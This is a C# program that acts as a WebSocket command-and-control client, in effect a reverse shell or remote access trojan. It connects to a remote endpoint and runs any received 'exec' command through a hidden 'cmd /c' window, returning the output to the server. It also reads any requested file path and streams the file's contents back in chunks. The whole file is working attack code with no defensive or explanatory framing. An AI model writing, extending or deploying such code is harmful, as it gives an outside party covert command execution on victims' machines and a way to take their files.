using Newtonsoft.Json;
using System;
using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;

namespace test1
{
    internal class Program
    {
        public static ClientWebSocket ws = new ClientWebSocket();
        static async Task Main()
        {
            try
            {
                await ws.ConnectAsync(Data.endpoint, CancellationToken.None);
                Console.WriteLine("connected!");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                return;
            }

            var buffer = new byte[4096];

            while (ws.State == WebSocketState.Open)
            {
                var ms = new MemoryStream();
                WebSocketReceiveResult result;

                do
                {
                    result = await ws.ReceiveAsync(
                        new ArraySegment<byte>(buffer),
                        CancellationToken.None
                    );

                    if (result.MessageType == WebSocketMessageType.Close)
                    {
                        await ws.CloseAsync(
                            WebSocketCloseStatus.NormalClosure,
                            "bye",
                            CancellationToken.None
                        );
                        return;
                    }

                    ms.Write(buffer, 0, result.Count);

                } while (!result.EndOfMessage);

                string json = Encoding.UTF8.GetString(ms.ToArray());

                await ParsePacket(json);
            }
        }

        static async Task ParsePacket(string json)
        {
            if (string.IsNullOrWhiteSpace(json))
                return;

            Packet packet;

            try
            {
                packet = JsonConvert.DeserializeObject<Packet>(json);
            }
            catch (Exception ex)
            {
                Console.WriteLine("bad json:");
                Console.WriteLine(json);
                Console.WriteLine(ex);
                return;
            }

            if (packet == null)
            {
                Console.WriteLine("packet null");
                return;
            }

            switch (packet.pt)
            {
                case PacketType.exec:
                    {
                        var pi = new ProcessStartInfo("cmd")
                        {
                            CreateNoWindow = true,
                            UseShellExecute = false,
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            Arguments = "/c " + packet.input
                        };

                        try
                        {
                            var p = Process.Start(pi);

                            string output = await p.StandardOutput.ReadToEndAsync();
                            string error = await p.StandardError.ReadToEndAsync();

                            p.WaitForExit();

                            var pa = new Packet
                            {
                                pt = PacketType.echo,
                                input = output + error
                            };

                            string outJson = JsonConvert.SerializeObject(pa);
                            byte[] bytes = Encoding.UTF8.GetBytes(outJson);

                            await ws.SendAsync(
                                new ArraySegment<byte>(bytes),
                                WebSocketMessageType.Text,
                                true,
                                CancellationToken.None
                            );
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex);

                            var pa = new Packet
                            {
                                pt = PacketType.echo,
                                input = "ERROR:\n" + ex
                            };

                            string outJson = JsonConvert.SerializeObject(pa);
                            byte[] bytes = Encoding.UTF8.GetBytes(outJson);

                            await ws.SendAsync(
                                new ArraySegment<byte>(bytes),
                                WebSocketMessageType.Text,
                                true,
                                CancellationToken.None
                            );
                        }

                        break;
                    }

                case PacketType.download:
                    {
                        try
                        {
                            byte[] file = File.ReadAllBytes(packet.input);
                            int chunkSize = 4096;

                            for (int i = 0; i < file.Length; i += chunkSize)
                            {
                                int size = Math.Min(chunkSize, file.Length - i);

                                byte[] chunk = new byte[size];
                                Array.Copy(file, i, chunk, 0, size);

                                var pa = new Packet
                                {
                                    pt = PacketType.recv,
                                    buffer = chunk
                                };

                                string jsonChunk = JsonConvert.SerializeObject(pa);
                                byte[] bytes = Encoding.UTF8.GetBytes(jsonChunk);

                                await ws.SendAsync(
                                    new ArraySegment<byte>(bytes),
                                    WebSocketMessageType.Text,
                                    true,
                                    CancellationToken.None
                                );
                            }

                            var end = new Packet { pt = PacketType.endofdwnld };
                            string endJson = JsonConvert.SerializeObject(end);

                            await ws.SendAsync(
                                new ArraySegment<byte>(Encoding.UTF8.GetBytes(endJson)),
                                WebSocketMessageType.Text,
                                true,
                                CancellationToken.None
                            );
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex);
                        }

                        break;
                    }

                case PacketType.disconnect:
                    await ws.CloseAsync(
                        WebSocketCloseStatus.NormalClosure,
                        "disconnected",
                        CancellationToken.None
                    );
                    break;
            }
        }
    }
}